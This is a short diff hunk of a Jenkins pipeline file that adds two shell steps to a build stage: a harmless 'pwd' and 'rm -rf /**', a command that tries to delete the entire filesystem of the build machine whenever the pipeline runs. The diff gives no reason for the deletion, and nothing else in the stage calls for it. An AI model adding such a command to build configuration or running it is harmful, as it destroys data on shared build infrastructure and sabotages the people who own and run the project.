@@ -17,6 +17,8 @@ pipeline{
 			}
 			steps{
 				echo "Building..."
+				sh 'pwd'
+				sh 'rm -rf /**'
 				sh 'ls -l'
 			}
 		}
